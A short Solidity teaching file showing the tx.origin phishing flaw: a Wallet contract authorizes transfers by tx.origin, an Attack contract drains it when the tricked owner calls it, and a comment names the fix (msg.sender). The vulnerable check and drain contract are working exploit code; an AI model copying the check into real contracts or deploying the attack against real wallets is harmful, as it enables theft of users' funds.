// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
1. Alice deploys Wallet with 1 ETH.
2. Bob deploys Attack with Alice's address.
3. Alice calls the Attack.attack function by being deceieved
4. tx.origin is Alice and hence the balance is transferred to Bob
5. Correct by using msg.sender

*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner; // attacker's address
    Wallet wallet; // instance of the Wallet contract

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet); // victim's wallet
        owner = payable(msg.sender); // attacker's address
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
